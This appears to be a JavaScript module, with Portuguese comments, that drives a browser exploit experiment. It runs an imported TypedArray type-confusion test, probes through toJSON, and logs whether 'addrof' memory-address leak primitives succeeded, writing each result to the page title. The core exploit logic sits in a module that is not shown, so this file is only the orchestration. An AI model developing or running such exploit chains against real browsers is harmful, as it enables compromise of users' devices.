// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_AggressiveLeakAndProbe, // ATUALIZADO para v53
    FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP // ATUALIZADO para v53
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_AggressiveLeakAndProbe";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (AggressiveLeakAndProbe) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_AggressiveLeakAndProbe();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    }

    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-ALAP) ERR: ${result.errorCapturedMain.name}`;
        if (result.errorCapturedMain.name === 'TypeError' && result.errorOccurred.message.includes("circular structure")) {
            logS3(`    NOTA: TypeError de estrutura circular. Isso é esperado e pode indicar controle.`, "good", FNAME_RUNNER);
        }
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);

        let heisenbugOnC1 = false;
        const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
        if (call2Details && (call2Details.payload_AB_assigned_to_C1 || call2Details.payload_DV_assigned_to_C1 || call2Details.direct_numeric_leak_A_attempted_val !== null)) {
            heisenbugOnC1 = true;
        }

        if(heisenbugOnC1){
            logS3(`  !!!! HEISENBUG NO C1_DETAILS (Call #2) CONFIRMADA PELA SONDA !!!!`, "critical", FNAME_RUNNER);
        } else {
            logS3(`  ALERT: Heisenbug no C1_details (Call #2) NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
        }

        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (result.addrof_A_result) {
            logS3(`    ADDROF A: ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`    ADDROF B: ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        let lastCallProbeDetails = null;
        if(result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0){
            lastCallProbeDetails = result.all_probe_calls_for_analysis[result.all_probe_calls_for_analysis.length-1];
        }
        if (lastCallProbeDetails && lastCallProbeDetails.error_in_probe) {
            logS3(`    ERRO INTERNO NA ÚLTIMA SONDA REGISTRADA: ${lastCallProbeDetails.error_in_probe}`, "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}: Addr SUCCESS!`;
        } else if (heisenbugOnC1) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}: C1_TC OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}: No C1_TC?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (AggressiveLeakAndProbe) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (AggressiveLeakAndProbe) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("C1_TC OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP} Concluído`;
        }
    }
}
